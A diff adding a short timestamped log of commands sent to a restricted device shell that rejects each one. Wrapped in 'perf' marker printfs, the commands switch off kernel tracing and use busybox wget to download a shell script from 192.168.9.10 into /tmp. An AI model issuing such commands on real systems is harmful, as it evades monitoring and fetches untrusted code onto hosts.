@@ -1,0 +1,13 @@
+2026-07-17T14:51:07.997416Z printf '__PERF_BEGIN_pyctl_get-1-dff182ae__\n'
+2026-07-17T14:51:08.854737Z Unknown command 'printf' - try 'help'
+2026-07-17T14:51:08.854949Z => test -w /sys/kernel/tracing/tracing_on && echo 0 > /sys/kernel/tracing/tracing_on; printf '__PERF_ACK_pyctl_get-1-dff182ae_TRACE_OFF__\n'
+2026-07-17T14:51:10.382949Z Unknown command 'test' - try 'help'
+2026-07-17T14:51:10.383116Z Unknown command 'printf' - try 'help'
+2026-07-17T14:51:10.383243Z => printf '__PERF_WORK_BEGIN_pyctl_get-1-dff182ae__\n'; { /bin/busybox wget -O /tmp/pyd http://192.168.9.10:8009/pyd-071e4e258421.sh; }; __perf_rc=$?; printf '__PERF_WORK_END_pyctl_get-1-dff182ae__\n'; printf '__PERF_ACK_pyctl_get-1-dff182ae_WORK__\n'
+2026-07-17T14:51:10.779649Z Unknown command 'printf' - try 'help'
+2026-07-17T14:51:10.779806Z Unknown command '{' - try 'help'
+2026-07-17T14:51:10.779881Z Unknown command '}' - try 'help'
+2026-07-17T14:51:10.779948Z Unknown command '__perf_rc=$?' - try 'help'
+2026-07-17T14:51:10.780009Z Unknown command 'printf' - try 'help'
+2026-07-17T14:51:10.780068Z Unknown command 'printf' - try 'help'
+2026-07-17T14:51:10.780137Z => printf '__PERF_END_pyctl_get-1-dff182ae__ rc=%s\n' "$__perf_rc"
